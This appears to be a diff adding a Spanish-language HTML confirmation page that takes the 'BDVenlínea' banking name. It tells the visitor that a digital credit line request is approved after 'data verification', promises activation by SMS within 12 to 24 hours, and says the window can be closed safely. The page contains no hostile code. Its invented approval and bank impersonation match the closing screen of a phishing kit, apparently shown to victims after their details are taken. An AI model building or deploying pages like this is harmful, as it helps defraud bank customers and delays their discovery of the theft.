@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Solicitud Registrada - BDVenlínea</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 40px 28px 36px;
+      width: 340px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .logo {
+      width: 180px;
+      margin-bottom: 24px;
+    }
+    .check-circle {
+      width: 60px;
+      height: 60px;
+      background: #2e7d32;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+    }
+    .check-circle svg {
+      width: 32px;
+      height: 32px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    h2 {
+      color: #2e7d32;
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .desc {
+      color: #555;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .info-box {
+      border: 1.5px dashed #bbb;
+      border-radius: 8px;
+      padding: 14px 16px;
+      width: 100%;
+      text-align: left;
+      margin-bottom: 18px;
+    }
+    .info-box p {
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 4px;
+    }
+    .info-box p:last-child { margin-bottom: 0; }
+    .info-box strong { color: #000; }
+    .footer-text {
+      color: #555;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="logo.png" alt="Logo" class="logo" onerror="this.style.display='none'"/>
+    <div class="check-circle">
+      <svg viewBox="0 0 24 24">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+    <h2>¡Solicitud Registrada!</h2>
+    <p class="desc">Su requerimiento de asignación para la Línea de Crédito Efectivo / Tarjeta de Crédito Digital ha sido procesado de manera exitosa.</p>
+    <div class="info-box">
+      <p><strong>Nro. de Trámite:</strong> 807980</p>
+      <p><strong>Operación:</strong> Ampliación de Perfil Crediticio</p>
+      <p><strong>Estado:</strong> Aprobado en proceso de liquidación</p>
+    </div>
+    <p class="footer-text">La verificación de sus datos concluyó con éxito. Recibirá los detalles de activación mediante un mensaje de texto en su número celular afiliado en un período de 12 a 24 horas hábiles. Puede cerrar esta ventana con total seguridad.</p>
+  </div>
+</body>
+</html>
